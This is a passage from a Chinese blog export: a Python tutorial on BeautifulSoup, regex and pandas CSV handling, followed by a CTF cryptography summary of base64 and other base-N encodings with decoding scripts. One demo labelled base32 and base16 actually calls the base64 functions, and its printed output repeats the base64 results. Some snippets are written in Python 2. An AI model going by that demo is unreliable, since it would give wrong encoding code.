id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;;and they lived at the bottom of a well.&lt;/p&gt;&lt;p class=&quot;story&quot;&gt;...&lt;/p&gt;&quot;&quot;&quot;soup = BeautifulSoup(html,&#x27;lxml&#x27;)print(soup.title)print(soup.head)print(soup.a)print(soup.p)print(type(soup.p)) 12345&lt;title&gt;The Dormouse&#39;s story&lt;&#x2F;title&gt;&lt;head&gt;&lt;title&gt;The Dormouse&#39;s story&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;a class&#x3D;&quot;sister&quot; href&#x3D;&quot;http:&#x2F;&#x2F;example.com&#x2F;elsie&quot; id&#x3D;&quot;link1&quot;&gt;&lt;!-- Elsie --&gt;&lt;&#x2F;a&gt;&lt;p class&#x3D;&quot;title&quot; name&#x3D;&quot;dromouse&quot;&gt;&lt;b&gt;The Dormouse&#39;s story&lt;&#x2F;b&gt;&lt;&#x2F;p&gt;&lt;class &#39;bs4.element.Tag&#39;&gt; 我们可以利用 soup 加标签名轻松地获取这些标签的内容，这些对象的类型是bs4.element.Tag。但是注意，它查找的是在所有内容中的第一个符合要求的标签。如果要查询所有的标签，后面会进行介绍。 Tag的两个重要的属性12345678910111213141516print soup.name# [document] #soup 对象本身比较特殊，它的 name 即为 [document]print soup.head.name# head #对于其他内部标签，输出的值便为标签本身的名称print soup.p.attrs# &#123;&#39;class&#39;: [&#39;title&#39;], &#39;name&#39;: &#39;dromouse&#39;&#125;# 在这里，我们把 p 标签的所有属性打印输出了出来，得到的类型是一个字典。print soup.p[&#39;class&#39;] # soup.p.get(&#39;class&#39;)# [&#39;title&#39;] #还可以利用get方法，传入属性的名称，二者是等价的soup.p[&#39;class&#39;] &#x3D; &quot;newClass&quot;print soup.p # 可以对这些属性和内容等等进行修改# &lt;p class&#x3D;&quot;newClass&quot; name&#x3D;&quot;dromouse&quot;&gt;&lt;b&gt;The Dormouse&#39;s story&lt;&#x2F;b&gt;&lt;&#x2F;p&gt; NavigableString1234567如果拿到标签后，还想获取标签中的内容。那么可以通过tag.string获取标签中的文字。示例代码如下：print soup.p.string# The Dormouse&#39;s storyprint type(soup.p.string)# &lt;class &#39;bs4.element.NavigableString&#39;&gt;thon 搜索文档树find和find_all方法搜索文档树，一般用得比较多的就是两个方法，一个是find，一个是find_all。find方法是找到第一个满足条件的标签后就立即返回，只返回一个元素。find_all方法是把所有满足条件的标签都选到，然后返回回去。 123soup.find_all(&quot;a&quot;,attrs&#x3D;&#123;&quot;id&quot;:&quot;link2&quot;&#125;)或者是直接传入属性的的名字作为关键字参数：soup.find_all(&quot;a&quot;,id&#x3D;&#39;link2&#39;) select方法使用以上方法可以方便的找出元素。但有时候使用css选择器的方式可以更加的方便。使用css选择器的语法，应该使用select方法。以下列出几种常用的css选择器方法： （1）通过标签名查找： 1print(soup.select(&#x27;a&#x27;)) （2）通过类名查找： 通过类名，则应该在类的前面加一个.。比如要查找class=sister的标签。示例代码如下： 1print(soup.select(&#x27;.sister&#x27;)) （3）通过id查找： 通过id查找，应该在id的名字前面加一个＃号。示例代码如下： 1print(soup.select(&quot;#link1&quot;)) （4）组合查找： 组合查找即和写 class 文件时，标签名与类名、id名进行的组合原理是一样的，例如查找 p 标签中，id 等于 link1的内容，二者需要用空格分开： 1print(soup.select(&quot;p #link1&quot;)) 直接子标签查找，则使用 &gt; 分隔： 1print(soup.select(&quot;head &gt; title&quot;)) （5）通过属性查找： 查找时还可以加入属性元素，属性需要用中括号括起来，注意属性和标签属于同一节点，所以中间不能加空格，否则会无法匹配到。示例代码如下： 1print(soup.select(&#x27;a[href=&quot;http://example.com/elsie&quot;]&#x27;)) （6）获取内容 以上的 select 方法返回的结果都是列表形式，可以遍历形式输出，然后用 get_text() 方法来获取它的内容。 123456soup = BeautifulSoup(html, &#x27;lxml&#x27;)print type(soup.select(&#x27;title&#x27;))print soup.select(&#x27;title&#x27;)[0].get_text()for title in soup.select(&#x27;title&#x27;): print title.get_text() 正则表达式数量词 &#123;n&#125;——作用于前一个字符或子表达式，匹配它重复n次 &#123;min,max&#125;——作用于前一个字符或子表达式，匹配它重复重复多少次min~max次，min和max可只写一个设置重复下限或上限，但逗号不能省，不写min时min默认为0 *——星号，作用于前一个字符或子表达式，匹配它零次或多次 +——作用于前一个字符或子表达式，匹配它至少一次 ?——作用于前一个字符或子表达式，匹配它零次或一次 1234r&#39;z&#123;3&#125;&#39;#匹配zzzr&#39;z&#123;0,3&#125;&#39;#匹配z或zz或zzzr&#39;(?:abc)&#123;2&#125;&#39;#对子表达式匹配两次，匹配abcabc，(?:)是一个用法，不分组的意思，详看后面#星号加号问号同理 预定字符集 \\d——匹配任一个数字（0~9） \\D——匹配一个非数字字符，与\\d互补 \\s——匹配一个空白字符，包括空格，\\t,\\n,\\r,\\n,\\f,\\v \\S——匹配一个非空白字符 \\w——匹配一个单词字符。unicode下匹配各种语言的单个字符，单个数字，和下横线。ASCII下匹配单个英文字母，单个数字，和下横线 \\W——匹配一个非单词字符 1r&#39;\\w&#39; #能匹配&#39;物语&amp;ものがたり&#39;中的：物，语，も，の，が，た，り，汉语日语的单字，其他语言同理 分组&amp;或&amp;转义 ()——括号，表达式分组（第n组，n=1，2，3….99，从左往右数），并形成子表达式 (?P&lt;name&gt;)——拥有括号的功能，但能为该分组再指定一个自定名字 (?P=name)——引用分配过名字的分组，但没有分组功能 |——或，左右规则任意匹配一个，从左往右尝试匹配，一旦成功就跳过后面的规则。|没被包在括号中间的话它的作用域是整个表达式，被包的话作用域在括号内 \\——反斜杠，后接功能字有符转义功能，后接数字（1到99）有引用分组的功能，后接某些字母又有特殊功能 1234r&#39;abc|def|ghi&#39;#匹配abc或def或ghir&#39;ma(?:k|d)e&#39;#匹配make或mader&#39;(abc)def\\1&#39;#相当于r&#39;(abc)defabc&#39;,匹配abcdefabcr&#39;(?P&lt;ok&gt;abc)f(?P&#x3D;ok)&#39;#为(abc)子组分配了“ok”的名字，然后再引用，匹配abcfabc 边界匹配 ^——放在表达式的最前面，作用域是表达式，在多行模式中，在每一行匹配字符串开头（多行模式要手动开启，否则和\\A没什么区别） $——放在表达式的最后面，作用域是表达式，在多行模式中，在每一行匹配字符串末尾（多行模式要手动开启，否则和\\Z没什么区别） \\A——放在表达式的最前面，作用域是表达式，匹配字符串开头，不能多行匹配 \\Z——放在表达式的最后面，作用域是表达式，匹配字符串末尾，不能多行匹配 \\b——不匹配字符，只匹配一个边界，匹配\\w和\\W或\\W和\\w的边界（单词字符和非单词字符的边界） \\B——不匹配字符，只匹配一个边界，与\\b相反，匹配\\w和\\w或\\W和\\W的边界 123456r&#39;^abc|^def&#39;#匹配abc开头或def开头，开启了多行模式时，对字符串&#39;abcd\\ndefh&#39;能匹配出abc，def两个r&#39;abc$|def$&#39;#匹配abc结尾或def结尾，开启了多行模式时，对字符串&#39;0abc\\n0def&#39;能匹配出abc，def两个r&#39;\\Aabc&#39;#匹配abc开头，因为不能多行匹配，就算开启多行模式，对字符串&#39;abcd\\nabcd&#39;只能匹配到前面的abc#\\Z同理r&#39;\\w\\b\\W&#39;#匹配“单词字符+非单词字符”的结构如&#39;a!&#39;,&#39;1%&#39;#\\B同理 标志位 flags正则表达式可以包含一些可选标志修饰符来控制匹配的模式。修饰符被指定为一个可选的标志，如 re.I | re.M 被同时设置成 I 和 M 标志： 修饰符 描述 re.I 忽略大小写（常用） re.L 做本地化识别（locale-aware）匹配 re.M 多行匹配，影响 ^ 和 $ re.S 使 . 匹配包括换行在内的所有字符 re.U 根据Unicode字符集解析字符。这个标志影响 \\w, \\W, \\b, \\B. re.X 该标志通过给予更灵活的格式，以便将正则表达式写得更易于理解。 re模块中的函数re.match函数match 方法用于查找字符串的头部（也可以指定起始位置），它是一次匹配，只要找到了一个匹配的结果就返回，而不是查找所有匹配的结果。 一次匹配，只要找到就返回找到的结果。 12import re # 使用之前先进行导入re模块re.match(pattern, string, flags) # match方法为例 参数 描述 pattern 匹配的正则表达式 string 要匹配的字符串 flags 标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。 该方法的结果是返回一个正则匹配对象，通过两个方法获取相关内容： 通过 group() 来获取内容 通过 span() 来获取范围：匹配到字符的开始和结束的索引位置 re.search函数re.search方法扫描整个字符串，返回的是第一个成功匹配的字符串，否则就返回None。 re.split函数主要适用于将字符串进行分割： 1re.split(pattern, string,maxsplit=0,flags=0) 用 pattern 分开 string 。 re.findall函数找出所有满足条件的，返回的是一个列表。 match 和 search 方法都是一次匹配，只要找到了一个匹配的结果就返回。然而，在大多数时候，我们需要搜索整个字符串，获得所有匹配的结果。 re.sub函数用来替换字符串。将匹配到的字符串替换为其他字符串。 取回匹配的数据在正则表达式中，可以对过滤到的字符串进行分组。分组使用圆括号的方式。将每一个正则表达式使用括号括起来。 123group()：和group(0)是等价的，返回的是整个满足条件的字符串。groups()：返回的是里面的子组。索引从1开始。group(n)：返回的是第一个子组，可以传入多个。 r Python中字符串前面加上 r 表示原生字符串 。 贪婪模式与非贪婪模式贪婪模式：正则表达式会匹配尽量多的字符。默认是贪婪模式。 非贪婪模式：正则表达式会尽量少的匹配字符。 贪婪模式 1(&#39;&lt;div class&#x3D;&quot;cont&quot;&gt;.*&lt;b&gt;(.*)&lt;&#x2F;b&gt;&#39;,text,re.DOTALL) 非贪婪模式 1(&#39;&lt;div class&#x3D;&quot;cont&quot;&gt;.*?&lt;b&gt;(.*)&lt;&#x2F;b&gt;&#39;,text,re.DOTALL) 可以看到非贪婪模式使用?表示只匹配一次或者匹配零次。 1234567import retext=&#x27;&lt;div class=&quot;cont&quot;&gt;&lt;p&gt;sdf&lt;/p&gt;&lt;b&gt;steady&lt;/b&gt;&lt;b&gt;s1eady&lt;/b&gt;&#x27;print(text)resault=re.findall(r&#x27;&lt;div class=&quot;cont&quot;&gt;.*&lt;b&gt;(.*?)&lt;/b&gt;&#x27;,text,re.DOTALL)print(&quot;贪婪模式&quot; + str(resault))resault=re.findall(r&#x27;&lt;div class=&quot;cont&quot;&gt;.*?&lt;b&gt;(.*?)&lt;/b&gt;&#x27;,text,re.DOTALL)print(&quot;非贪婪模式&quot; + str(resault)) 输出 12贪婪模式[&#39;s1eady&#39;]非贪婪模式[&#39;steady&#39;] 可以看到主要是使用?匹配一次或者零次，来阻止贪婪模式。 中括号和括号()是为了提取匹配的字符串。表达式中有几个()就有几个相应的匹配字符串。 []是定义匹配的字符范围。比如 [a-zA-Z0-9] 表示相应位置的字符要匹配英文字符和数字。[\\s*]表示空格或者*号。 圆括号()是组，主要应用在限制多选结构的范围/分组/捕获文本/环视/特殊模式处理。()内的内容表示的是一个子表达式，()本身不匹配任何东西，也不限制匹配任何东西，只是把括号内的内容作为同一个表达式来处理。 (abc|bcd|cde)，表示这一段是abc、bcd、cde三者之一均可，顺序也必须一致。 方括号是单个匹配，字符集/排除字符集/命名字符集。[]表示匹配的字符在[]中，并且只能出现一次，并且特殊字符写在[]会被当成普通字符来匹配。 [0-3]，表示找到这一个位置上的字符只能是0到3这四个数字，与(abc|bcd|cde)的作用比较类似，但圆括号可以匹配多个连续的字符，而一对方括号只能匹配单个字符。 例子1234import retest=&quot;steady&quot;resault=re.match(&#x27;[e]&#x27;,test)print(resault.group()) 输出： 1234Traceback (most recent call last): File &quot;/Users/apple/Desktop/steady.py&quot;, line 4, in &lt;module&gt; print(resault.group())AttributeError: &#x27;NoneType&#x27; object has no attribute &#x27;group&#x27; 1234import retest=&quot;steady&quot;resault=re.match(&#x27;[s]&#x27;,test)print(resault.group()) 输出： 1s 1234import retest=&quot;7667-786876&quot;resault=re.match(&#x27;[\\d]*&#x27;,test)print(resault.group()) 输出： 17667 1234import retest=&quot;7667-786876&quot;resault=re.match(&#x27;\\d+&#x27;,test)print(resault.group()) 输出： 17667 1234import retest=&quot;7667-786876&quot;resault=re.match(&#x27;\\d?&#x27;,test)print(resault.group()) 输出： 17 1234import retest=&quot;7667-786876&quot;resault=re.match(&#x27;\\d&#123;3&#125;&#x27;,test)print(resault.group()) 输出： 1766 1234import retest=&quot;7667-786876&quot;resault=re.match(&#x27;\\d&#123;0,10&#125;&#x27;,test)print(resault.group()) 输出： 17667 1234import retest=&quot;7667-786876&quot;resault=re.match(&#x27;^76&#x27;,test)print(resault.group()) 输出 176 1234import retest=&quot;7667-786876&quot;resault=re.match(&#x27;^763&#x27;,test)print(resault.group()) 输出 1234Traceback (most recent call last): File &quot;/Users/apple/Desktop/steady.py&quot;, line 4, in &lt;module&gt; print(resault.group())AttributeError: &#x27;NoneType&#x27; object has no attribute &#x27;group&#x27; 小案例身份证 前17位必须是数字，后一位可以是数字或者x或者X。 12345678import relists = [&#x27;370787199927261616&#x27;,&#x27;370787199927261614&#x27;,&#x27;3707871999272616SS&#x27;,&#x27;37078719992726162X&#x27;,&#x27;37078719992726D616&#x27;]for l in lists: resault=re.match(&#x27;\\d&#123;17&#125;[\\dxX]&#x27;,l) try: print(resault.group()) except: pass 手机号 第一位必须是1，一共十一位，无字母。 12345678import relists = [&#x27;19862123063&#x27;,&#x27;29862123063&#x27;,&#x27;198df123063&#x27;,&#x27;1986212d063&#x27;,&#x27;198621230dd&#x27;,&#x27;1987261267171&#x27;]for l in lists: resault=re.match(&#x27;1\\d&#123;10&#125;&#x27;,l) try: print(resault.group()) except: pass 网站URL 12345678import relists = [&#x27;http://www.steady.com&#x27;,&#x27;https://www.steady.com&#x27;,&#x27;http:/www.steady.com&#x27;,&#x27;http://www.steady.top&#x27;,&#x27;http://ww.ls.com&#x27;,&#x27;http://www.dd.com&#x27;,&#x27;ftp://www.steady.com&#x27;]for l in lists: resault=re.match(&#x27;(ftp|http|https)://.*.(com|top)$&#x27;,l) try: print(resault.group()) except: pass csv文件处理读取csv文件表头不作为第一行 123import pandas as pddata &#x3D; pd.read_csv(&quot;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;huazhu.com.csv&quot;)print(data) 表头作为第一行 123import pandas as pddata &#x3D; pd.read_csv(&quot;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;huazhu.com.csv&quot;,header&#x3D;None)print(data) 获取数据获取指定列的数据，并存入一个数组中。 从文件中取出url并写入一个文件。 123456789import pandas as pdimport numpy as npdata = pd.read_csv(&quot;/Users/apple/Desktop/huazhu.com.csv&quot;)url = data[&quot;url&quot;]url_list = np.array(url)with open(&#x27;/Users/apple/Desktop/huazhu_url.txt&#x27;,&#x27;w&#x27;) as fp: for i in url_list: print(i) fp.write(i+&quot;\\n&quot;)","categories":[{"name":"Python学习","slug":"Python学习","permalink":"http://s1eady.top/categories/Python%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://s1eady.top/tags/Python/"}]},{"title":"CTF-密码题总结","slug":"CTF-密码题总结","date":"2018-12-06T23:20:30.000Z","updated":"2020-11-06T11:13:02.337Z","comments":true,"path":"2018/12/07/CTF-密码题总结/","link":"","permalink":"http://s1eady.top/2018/12/07/CTF-%E5%AF%86%E7%A0%81%E9%A2%98%E6%80%BB%E7%BB%93/","excerpt":"","text":"CTF–密码Base64原理Base64编码是基于64个字符A-Z,a-z，0-9，+，/的编码方式，因为2的6次方正好为64，所以就用6bit就可以表示出64个字符，eg:000000对应A，000001对应B。 每三个字符一组 1、每个字符转成八位二进制，一共是24位二进制。 2、24四位二进制转化成四个六位的二进制。 3、四个六位的二进制转化成十进制。 4、对应base64编码表将十进制转化成对应的字符。 特点 标准Base64只有64个字符（英文大小写、数字和+、/）以及用作后缀等号； Base64是把3个字节变成4个可打印字符，所以Base64编码后的字符串一定能被4整除（不算用作后缀的等号）； 等号一定用作后缀，且数目一定是0个、1个或2个。这是因为如果原文长度不能被3整除，Base64要在后面添加0凑齐3n位。为了正确还原，添加了几个0就加上几个等号。显然添加等号的数目只能是0、1或2； 严格来说Base64不能算是一种加密，只能说是编码转换。 12345678910111213141516171819202122232425262728293031323334353637383940import binasciiprint(&quot;制作base64编码表：&quot;)string_temp =&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;base64_dict = &#123;&#125;for i in range(64): base64_dict[i] = string_temp[i]print(base64_dict)s=[&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;]a=&#x27;&#x27;string=&#x27;&#x27;for i in s: a+=str(ord(i)) b=bin(int(a))[2:] while len(b)!=8: a=&#x27;0&#x27; b=a+b string+=bprint(&quot;每三个字符转换成二进制:&quot;+string)h=&quot;&quot;hb=[]for i in range(0,25,6): h=string[i:i+6] hb.append(h)print(&quot;每三个八位二进制转化成四个六位二进制：&quot;)for i in hb: print(i)print(&quot;每六位二进制转化成十进制：&quot;)for i in hb: while &#x27;&#x27; in hb: hb.remove(&#x27;&#x27;) print(int(i,2))bs=&quot;&quot;print(&quot;十进制对应base64表转化：&quot;)for i in hb: i=int(i,2) if int(i)&gt;64: i=i%64 print(base64_dict[i]) bs+=base64_dict[i]print(bs) Python与Base64base64b64encode：b64encode 的参数 s 的类型必须是字节包（bytes）。 b64decode：b64decode 的参数 s 可以是字节包（bytes），也可以是字符串（str）。 编码字符串实例字符长度为能被3整除 字符串长度不能被3整除 混合加密base64与base32混合加密 1234567891011121314151617import base64def base(s): try: s = base64.b32decode(s) s = base(s) except: try: s = base64.b64decode(s) s = base(s) except: return s return sf = open(&#x27;/Users/apple/Downloads/base/base.txt&#x27;)text = f.read()print(base(text)) 1234567891011121314151617181920212223import base64dic64 = [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;]dic32 = [&#x27;G&#x27;, &#x27;H&#x27;, &#x27;I&#x27;, &#x27;J&#x27;, &#x27;K&#x27;, &#x27;L&#x27;]res = open(&#x27;enc.txt&#x27;,&#x27;r&#x27;).read()def findchr(text, dic): for i in dic: if text.find(i) &gt;= 0: return True return Falsewhile True: if(findchr(res, dic64)): res = base64.b64decode(res) elif(findchr(res, dic32)): res = base64.b32decode(res) else: res = base64.b16decode(res) if(res.startswith(&#x27;flag&#123;&#x27;)): print res break 1234567891011from base64 import *with open(&#x27;enc.txt&#x27;) as f:c=f.read()while 1: try:c=b16decode(c) except: try:c=b32decode(c) except: try:c=b64decode(c) except: print(c) break 移位加密“flag”使用base64加密后的字符串是 ZmxhZw== 前面的ZmxhZ不管flag后面是什么都不会改变。我们对比一下前四个字符，”Zmxh”和”3EP/“在base64表中查一下，Z和3差了30，m和E差了30。将s根据位移移动相应位置找到原本的base64，但是加密之后的字符串要是4的倍数，如果不是则需要加”=”。 12345678910import base64s= &#x27;3EP/3VNFFmNEAnlHD5dCMmVHD5ad9uG&#x27;t = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;l=&quot;&quot;for i in s: l += t[(t.index(i)-30)%64]if len(l)%4!=0: l=l+&quot;=&quot;*(4-(len(l)%4))print(base64.b64decode(l)) base64隐写1234567891011121314151617181920212223242526272829303132333435def get_base64_diff_value(s1, s2): base64chars = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27; res = 0 for i in xrange(len(s2)): if s1[i] != s2[i]: return abs(base64chars.index(s1[i]) - base64chars.index(s2[i])) return resdef solve_stego(): with open(&#x27;/Users/apple/Desktop/1.txt&#x27;, &#x27;rb&#x27;) as f: file_lines = f.readlines() bin_str = &#x27;&#x27; for line in file_lines: steg_line = line.replace(&#x27;\\n&#x27;, &#x27;&#x27;) norm_line = line.replace(&#x27;\\n&#x27;, &#x27;&#x27;).decode(&#x27;base64&#x27;).encode(&#x27;base64&#x27;).replace(&#x27;\\n&#x27;, &#x27;&#x27;) diff = get_base64_diff_value(steg_line, norm_line) print diff pads_num = steg_line.count(&#x27;=&#x27;) if diff: bin_str += bin(diff)[2:].zfill(pads_num * 2) else: bin_str += &#x27;0&#x27; * pads_num * 2 print goflag(bin_str)def goflag(bin_str): res_str = &#x27;&#x27; for i in xrange(0, len(bin_str), 8): res_str += chr(int(bin_str[i:i + 8], 2)) return res_strif __name__ == &#x27;__main__&#x27;: solve_stego() 多次加密1234567891011121314151617181920212223# coding:utf8import base64def repeatedb64decode(ciphertext, times): for i in range(times): try: ciphertext = base64.b64decode(ciphertext) except Exception: return ciphertext return ciphertextdef recursive64decode(ciphertext): while True: try: ciphertext = base64.b64decode(ciphertext) except Exception: return ciphertextdef repeatedb64encode(plaintext , times): for i in range(times): plaintext = base64.b64encode(plaintext) return plaintextciphertext = &quot;TVdJd09HRm1NamMyWkdKak56VTVNekkzTVdZMFpXVTJNVFl5T0Rrek1qUWxNRUZsTW1GbE0yRXlNelV3TnpRell6VXhObU5rWVRReE1qUTVPV0poTTJKbE9TVXdRV0prWlRVeVkySXpNV1JsTXpObE5EWXlORFZsTURWbVltUmlaRFptWWpJMEpUQkJaVEl6WlRBd1ltVXpPV1F6Tm1Zek5EWXlaVFUzTm1FMk4yRTNaamt4T1RrbE1FRXhPR00zT1RJNE5XSTFNVFJqTmpObVl6a3dNelZsTTJZNU1qQmhaVFEzTnlVd1FXUmhORFJrWkRFNU1tUmxabVF4WW1VM09XWTJNMk16TlRCa01qa3lNR05tSlRCQk5ESTFNV00wWXpZME9XTTNaREptT0RZek1qZGxabVJsTWpNNU9USm1ZVGNsTUVGaFlXVTNZakprTkRneU16Z3lZV0ZoWkRjMVptUmxOalJrWmpobVpqZzJaaVV3UVRJNU5tWTNabVpqTW1VME5UUTFaR00zTnpreU1EVXdZMlZpTkdFNE56RXhKVEJCTmpFd04yRmpNV0UxTldZeFpUQm1aV05pTjJSa1lqWXdabUl6WW1ZeE1Ea2xNRUZoWldNeU16TXpNekl4WkRjek1EQXdNVFl4TmpneVpETmpOR1ZpWXpBd09TVXdRVFV3TURWaU0ySm1NREF3TlRCaVpqUm1OMlUwTTJGak16TmhNRFExTkdJNEpUQkI=&quot;print repeatedb64decode(ciphertext,2) base64表反序12345678910cipher &#x3D; &#39;mZOemIStmomajYyaoL2&#x2F;jJqgycuC&#39;dic &#x3D; &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&#39;dic &#x3D; dic[::-1]m &#x3D; &#39;&#39;for i in xrange(0, len(cipher), 4): a, b, c, d &#x3D; dic.index(cipher[i]), dic.index(cipher[i+1]), dic.index(cipher[i+2]), dic.index(cipher[i+3]) m +&#x3D; chr((a&lt;&lt;2&amp;0xff)+(b&gt;&gt;4)) m +&#x3D; chr((b&lt;&lt;4&amp;0xff)+(c&gt;&gt;2)) m +&#x3D; chr((c&lt;&lt;6&amp;0xff)+d)print m 加密1234import base64S = b&#x27;I like Python&#x27;steady = base64.b64encode(S)print(str(steady,encoding=&#x27;utf-8&#x27;)) 解密1234import base64S = &#x27;SSBsaWtlIFB5dGhvbg==&#x27;steady = base64.b64decode(S)print(str(steady,encoding=&#x27;utf-8&#x27;)) base家族base32Base32使用了ASCII编码中可打印的32个字符**(大写字母A-Z和数字2~7)**对任意字节数据进行编码.Base32将串起来的二进制数据按照5个二进制位分为一组,由于传输数据的单位是字节(即8个二进制位).所以分割之前的二进制位数是40的倍数(40是5和8的最小公倍数).如果不足40位,则在编码后数据补充=,一个=相当于一个组(5个二进制位),编码后的数据是原先的五分之八倍。末尾最多有6个=。 base16Base16编码就是将ASCII字符集中可打印的字符**(数字0-9和字母A-F)**对应的二进制字节数据进行编码，不会出现=，数据量是原先的两倍。 base36Base36包含0~9的数字，加上所有26个字母，不区分大小写，不包含任何标点，所有的字母要不全大写，要不全小写。所以加起来就是 “0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ”,或者”0123456789abcdefghijklmnopqrstuvwxyz“ 特征特点：密文由36个字符（0-9,a-z）组成，加密仅支持整数数字，解密仅支持字符串，不支持中文密文由36个字符（0-9,A-Z） base58base58采用的字符集为“123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ”，从这不难看出，Base58是纯数字与字母组成而且去掉了容易引起视觉混淆的字符（0：数字零，O：大写O，I：大写i，l:小写L）。9个数字+49个字母=58个。由于没有特殊字符所以在采用鼠标双击或移动设备选择时可以自动识别全选。Base58本身就是URLSafe。Base64的URFSafe模式虽然已经对URL支持的比较好，但UUID中还是包含“-或_”。目前流行的比特币，采用的就是Base58Check编码，是在Base58基础上又增加了安全效验机制。 特征特点：Base58是用于Bitcoin中使用的一种独特的编码方式，主要用于产生Bitcoin的钱包地址，Base58不使用数字”0”，字母大写”O”，字母大写”I”，和字母小写”l”，以及”+”和”/”符号 解密 12345C &#x3D; &quot;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&quot;org &#x3D; 0for d in flag: org &#x3D; org*58 + C.index(d)print (&quot;%x&quot;%org).decode(&quot;hex&quot;) base62同样的还有 base62编码，就是26个字母的大小写再加上0-9，一共62个字符。 相比于base64只是去掉了两个在网络上不便传输的符号 特征特点：密文由62字符（0-9，a-z，A-Z）组成 18nCDq36gzGn8hf4M2HJUsn4aYcYRBSJwj4aE0hbgpzHb4aHcH1zzC9C3IL base91特征特点：密文由91个字符（0-9，a-z，A-Z,!#$%&amp;()*+,./:;&lt;=&gt;?@[]^_`{|}~”）组成 12345678910111213141516import base64print(&quot;base64:&quot;)encode64 = base64.b64encode(b&#x27;I love you&#x27;)decode64 = base64.b64decode(b&#x27;SSBsb3ZlIHlvdQ==&#x27;)print(encode64)print(decode64)print(&quot;base32:&quot;)encode32 = base64.b64encode(b&#x27;I love you&#x27;)decode32 = base64.b64decode(b&#x27;SSBsb3ZlIHlvdQ==&#x27;)print(encode32)print(decode32)print(&quot;base16:&quot;)encode16 = base64.b64encode(b&#x27;I love you&#x27;)decode16 = base64.b64decode(b&#x27;SSBsb3ZlIHlvdQ==&#x27;)print(encode16)print(decode16) 123456789base64:b&#x27;SSBsb3ZlIHlvdQ==&#x27;b&#x27;I love you&#x27;base32:b&#x27;SSBsb3ZlIHlvdQ==&#x27;b&#x27;I love you&#x27;base16:b&#x27;SSBsb3ZlIHlvdQ==&#x27;b&#x27;I love you&#x27; 字符串逆序12steady_str&#x3D;&quot;galf&#123;Lsklth_jxih_guxz_jsgtexp&#125;&quot;print(steady_str[::-1]) 进制转化两个一组转化为十六进制然后在转化为ascii 1234567str1=&#x27;d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9e1e6b3e3b9e4b3b7b7e2b6b1e4b2b6b9e2b1b1b3b3b7e6b3b3b0e3b9b3b5e6fd&#x27;flag=&quot;&quot;while len(str1): print(len(str1)) flag+=chr(int(str1[:2],16)%128) str1=str1[2:]print(flag) 字符串分割 123456str1=&quot;cvqAeqacLtqazEigwiXobxrCrtuiTzahfFreqc&#123;bnjrKwgk83kgd43j85ePgb_e_rwqr7fvbmHjklo3tews_hmkogooyf0vbnk0ii87Drfgh_n kiwutfb0ghk9ro987k5tfb_hjiouo087ptfcv&#125;&quot;flag=&quot;&quot;print(str1[0])for i in range(3,len(str1),5): flag+=str1[i]print(flag) 混合进制解密 123456789101112131415161718text = &#x27;d87 x65 x6c x63 o157 d109 o145 b100000 d116 b1101111 o40 x6b b1100101 b1101100 o141 d105 x62 d101 b1101001 d46 o40 d71 x69 d118 x65 x20 b1111001 o157 b1110101 d32 o141 d32 d102 o154 x61 x67 b100000 o141 d115 b100000 b1100001 d32 x67 o151 x66 d116 b101110 b100000 d32 d102 d108 d97 o147 d123 x31 b1100101 b110100 d98 d102 b111000 d49 b1100001 d54 b110011 x39 o64 o144 o145 d53 x61 b1100010 b1100011 o60 d48 o65 b1100001 x63 b110110 d101 o63 b111001 d97 d51 o70 d55 b1100010 d125 x20 b101110 x20 b1001000 d97 d118 o145 x20 d97 o40 d103 d111 d111 x64 d32 o164 b1101001 x6d o145 x7e&#x27;s=text.split()print(s)flag=&quot;&quot;for i in s: if i[0]==&#x27;d&#x27;: i=chr(int(i[1:])) flag+=i elif i[0]==&#x27;x&#x27;: i=chr(int((&#x27;0&#x27;+i),16)) flag+=i elif i[0]==&#x27;b&#x27;: i=chr(int((&#x27;0&#x27;+i),2)) flag+=i elif i[0]==&#x27;o&#x27;: i=chr(int((&#x27;0&#x27;+i),8)) flag+=iprint(flag) 十六进制准换ascii 1234567steady_str=&quot;57656C6C20646F6E653A4A35584759364A414E3558474B4944544F525358414944424F355158534F5352474934584B5752544A4A5547495343574F4E4D56515554514D495A444B3653504E55345755594C4F494933574B334C554F425257323442544D4A4C5451354443474A344847594C4A4746325745563359474E47464F3444574D56445757354445493459584D5953484756345745334A5A47425347324D4C324D5A49543250493D&quot;steady_flag=&quot;&quot;for i in range(0,len(steady_str),2): h=&quot;0x&quot;+steady_str[i:i+2] n=int(h,16) steady_flag+=chr(n)print(steady_flag) 八进制八进制有 0~7 共8个数字，在CTF编码中，常见的数字中如果没有超过8的数字且长度为3的倍数，则大多为八进制。通常我们将数字三个一组转化为十进制然后ascii，进而得到flag。 12345steady_str=&quot;146154141147173110141166145137171060125137120171137163143162151160164137117164143137124157137124145156137101163143151151041175&quot;flag=&quot;&quot;for i in range(0,len(steady_str),3): flag+=chr(int(steady_str[i:i+3],8))print(flag) 使用python-oct转化成八进制的时候默认会带有0o 123456steady_str=&quot;flag&quot;steady_num=&quot;&quot;for i in steady_str: steady_num+=oct(ord(i))print(steady_num)146154141147 123456steady_str=&quot;ctf&quot;steady_num=&quot;&quot;for i in steady_str: steady_num+=oct(ord(i))[2:]print(steady_num)143164146 同理 CTF—103124106 FLAG–106114101107 在CTF中一定要注意这几个数字。 